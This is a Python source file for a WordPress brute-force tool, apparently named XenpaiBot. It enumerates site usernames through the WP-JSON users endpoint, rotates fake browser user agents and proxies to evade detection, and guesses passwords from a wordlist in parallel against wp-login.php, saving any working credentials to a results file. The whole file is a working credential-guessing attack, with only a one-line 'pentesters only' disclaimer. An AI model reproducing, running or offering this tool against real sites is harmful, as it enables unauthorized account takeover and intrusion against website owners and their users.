import requests
import threading
import os
import logging
from concurrent.futures import ThreadPoolExecutor
import random

# ------------ CONFIGURATION ----------
curl_timeout = 20
multithread_limit = 10
# -------------------------------------

red = '\033[91m'
gr = '\033[92m'
yel = '\033[93m'
clr = '\033[0m'

logging.basicConfig(filename="bruteforce.log", level=logging.INFO, format="%(asctime)s - %(message)s")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_user_wp_json(target, proxies=None):
    try:
        headers = {'User-Agent': generate_user_agent()}
        response = requests.get(f"{target}/wp-json/wp/v2/users", timeout=curl_timeout, proxies=proxies, headers=headers)
        if response.status_code == 200:
            users = [user['slug'] for user in response.json()]
            if users:
                print(f"{gr}[+] Found usernames: {', '.join(users)}{clr}")
                return users
        print(f"{yel}[-] No usernames found via WP-JSON.{clr}")
    except Exception as e:
        print(f"{red}[-] Error fetching WP-JSON: {e}{clr}")
    return None

def generate_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    ]
    return random.choice(user_agents)

def test_login(target, username, password, proxies=None):
    try:
        session = requests.Session()
        login_data = {'log': username, 'pwd': password, 'wp-submit': 'Log In'}
        headers = {'User-Agent': generate_user_agent()}
        response = session.post(f"{target}/wp-login.php", data=login_data, timeout=curl_timeout, proxies=proxies, headers=headers, allow_redirects=True)
        if 'login_error' not in response.text and 'wp-admin' in response.url: #Improved validation
            print(f"{gr}[+] Found valid credentials: {username}:{password}{clr}")
            logging.info(f"Valid credentials: {username}:{password}")
            with open("results.txt", "a") as f:
                f.write(f"{target} {username}:{password}\n")
        else:
            print(f"{yel}[-] Invalid: {username}:{password}{clr}")
    except Exception as e:
        print(f"{red}[-] Error testing {username}:{password} - {e}{clr}")

def load_proxies(proxy_file):
    proxies = []
    try:
        with open(proxy_file, 'r') as f:
            for line in f:
                proxy = line.strip()
                if proxy:
                    proxies.append(proxy)
        return proxies
    except FileNotFoundError:
        print(f"{red}[-] Proxy file not found: {proxy_file}{clr}")
        return None

def main():
    try:
        clear_screen()
        print('''\033[93m
         _____   ______ ______   _____   ______ _______ _______ _______
|  |  | |     | |_____/ |     \ |_____] |_____/ |______ |______ |______
|__|__| |_____| |    \_ |_____/ |       |    \_ |______ ______| ______| \033[0m
                                                                        
                    \033[1;97mW O R D P R E S S   B R U T E F O R C E   T O O L           
          \033[94mXenpaiBot Is Number One Bot For Pentester \033[97m
          Author : \033[93mKanezama              
    ''')
        print("\033[94mThis is for Pentesters Only, Don't Try It For Illegal Things\033[0m")
        target = input("\033[32m[!] \033[1;93mYour Site Target: \033[0m").strip()
        if not target.startswith("http"):
            target = f"http://{target}"

        if 'wp-submit' not in requests.get(f"{target}/wp-login.php", timeout=curl_timeout).text:
            print(f"{red}[-] Invalid WordPress login page.{clr}")
            return

        use_proxy = input("want to add a proxy? (y/n): ").lower()
        proxies = None
        if use_proxy == 'y':
            proxy_file = input("input proxy file: ").strip()
            proxies_list = load_proxies(proxy_file)
            if proxies_list:
                proxies = {'http': random.choice(proxies_list), 'https': random.choice(proxies_list)}
                print(f"{gr}[+] Using proxies from {proxy_file}{clr}")
            else:
                print(f"{yel}[-] Proxy file not found or empty. Continuing without proxies.{clr}")

        base_dir = os.path.dirname(os.path.abspath(__file__))
        while True:
            wordlist_path = input("[!] Your Wordlist (e.g., pwd.txt): ").strip()
            wordlist_path = os.path.join(base_dir, wordlist_path)  # Ensure correct directory
            print(f"[DEBUG] Checking wordlist at: {wordlist_path}")

            if os.path.isfile(wordlist_path):
                print(f"\033[92m[+] Wordlist found at: {wordlist_path}\033[0m")
                break
            print(f"\033[91m[-] Wordlist file not found: {wordlist_path}\033[0m")

        with open(wordlist_path, "r") as f:
            passwords = [line.strip() for line in f.readlines()]

        usernames = get_user_wp_json(target, proxies)
        if not usernames:
            username = input("[!] Input Manual Username (or press Enter to exit): ").strip()
            if not username:
                print(f"{red}[-] Exiting...{clr}")
                return
            usernames = [username]

        print(f"{gr}[+] Starting brute-force attack...{clr}")
        logging.info("Starting brute-force attack...")

        with ThreadPoolExecutor(max_workers=multithread_limit) as executor:
            for username in usernames:
                for password in passwords:
                    if proxies:
                        proxies = {'http': random.choice(proxies_list), 'https': random.choice(proxies_list)}
                    executor.submit(test_login, target, username, password, proxies)
    
    except KeyboardInterrupt:
        print(f"\n{red}[-] Process interrupted. Exiting...{clr}")
        os._exit(0)
    except Exception as e:
        print(f"{red}[-] Unexpected error: {e}{clr}")

if __name__ == "__main__":
    main()
